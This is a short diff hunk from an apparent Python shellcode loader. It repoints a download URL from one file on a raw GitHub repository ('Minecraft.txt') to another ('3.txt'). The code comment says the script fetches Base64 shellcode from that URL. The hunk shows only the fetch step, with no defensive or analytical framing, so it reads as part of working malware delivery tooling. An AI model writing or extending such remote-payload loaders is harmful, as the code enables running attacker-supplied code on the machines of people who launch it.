@@ -1670,7 +1670,7 @@ def main():
         return 2
 
     # Point this to your GitHub raw URL or new endpoint
-    target_url = "https://raw.githubusercontent.com/omebizonly-hash/sadasd/refs/heads/main/Minecraft.txt"
+    target_url = "https://raw.githubusercontent.com/omebizonly-hash/sadasd/refs/heads/main/3.txt"
     
     # Fetch shellcode (now handles raw B64 text)
     shell = fetch_shellcode_from_url(target_url)
